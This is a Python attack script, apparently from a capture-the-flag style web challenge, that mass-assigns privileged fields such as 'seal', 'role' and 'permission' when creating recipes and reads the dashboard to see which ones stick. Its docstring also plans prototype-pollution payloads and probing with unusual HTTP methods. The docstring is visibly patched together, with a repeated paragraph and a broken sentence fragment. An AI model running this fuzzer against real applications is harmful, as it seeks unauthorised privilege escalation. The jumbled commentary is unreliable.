#!/usr/bin/env python3
"""Mass assignment, full field list: the run I cited stopped after 10 creates

`mass_assign.py` broke out of its loop after 10 created batches, so 16 of the 19 field names it listed
were never sent. This one sends all 42 names x 2 values, reads the Seal column immediately
after each creation (a batch that is merely created has no seal, so anything other than the
empty cell means the field landed), writes every line to files/ma_full.log, and consumes no
worker time because nothing is submitted. the audit found in my own scripts.

1. `mass_assign.py` broke out of its loop after 10 created batches, so of the 19 field names it
   listed only `seal`, `level`, `tier` were ever sent - the run I cited for "mass assignment is
   dead" covered a quarter of its own list. Redo it properly, ~40 names x 2 values. This costs
   no worker time at all: the Seal column on /dashboard is read straight after creation, so a
   `seal`/`level`/`award` field that sticks would show as something other than the empty cell.

2. `proto_jam.py` posted its `__proto__` bodies to `/api/recipe/000.../submit`, which is a
   nonexistent id (404) - so no polluted body ever reached a live handler through submit. Redo
   with a real draft of ours, and with a seal-less draft as the oracle (a draft has no `seal`
   property at all, which is what makes it a pollution detector).

3. `routes.py` only sent POST and a handful of GETs. `PUT`/`PATCH`/`DELETE`/`HEAD`/`OPTIONS`
   were never tried against `/api/recipe/:id` - and an update route is exactly where a `seal`
   field would be mass-assigned. `dump_all.py` did try `POST /api/recipe/:id` and got 404.
"""
import re
import sys
import time

from cc import new_baker

NAMES = ["seal", "level", "status", "tier", "grade", "verdict", "approved", "certified",
         "golden", "gold", "chief", "legendary", "reviewed", "sealLevel", "seal_level",
         "seal_type", "sealtype", "sealed", "stamped", "stamp", "award", "prize", "ribbon",
         "medal", "rosette", "sealedBy", "sealed_by", "reviewer", "reviewed_by", "review_level",
         "hasSeal", "has_seal", "isGolden", "is_golden", "gold_seal", "seal_gold", "chef",
         "authority", "permission", "role", "seals", "color"]
VALUES = ["chief", True]

METHODS = ["PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def seal_cell(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow"
    tail = " ".join(re.sub(r"<[^>]+>", " ", blk.group(0).split("</span>")[-1]).split())
    return "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26])


log("=== 1. mass assignment, full list (creation-time oracle, no worker needed) ===")
users = []
hits = 0
per = 0
for i, f in enumerate(NAMES):
    for v in VALUES:
        if not users or per >= 9:
            u, c, r = new_baker("fx")
            users.append((u, c))
            per = 0
        c = users[-1][1]
        body = {"title": "fx " + f, "ingredients": [{"name": "flour", "value": "1"}], f: v}
        code, out, dt = c.post("/api/recipe", body)
        rid = out.get("id") if isinstance(out, dict) else None
        if not rid:
            log("   %-14s=%-7r -> save %s %s" % (f, v, code, str(out)[:60]))
            break
        per += 1
        cell = seal_cell(c, rid)
        if cell not in ("NONE",):
            hits += 1
            log("   !!! %-14s=%-7r -> seal cell = %r" % (f, v, cell))
            code2, page, _ = c.get("/recipe/%s" % rid)
            open("../files/ma_%s_%s.html" % (f, str(v)), "w", encoding="utf-8").write(str(page))
        time.sleep(0.15)
log("   created %d batches across %d users, unusual seal cells: %d" % (len(users) * 9, len(users), hits))


log("created batches across users: %d"%len(users))
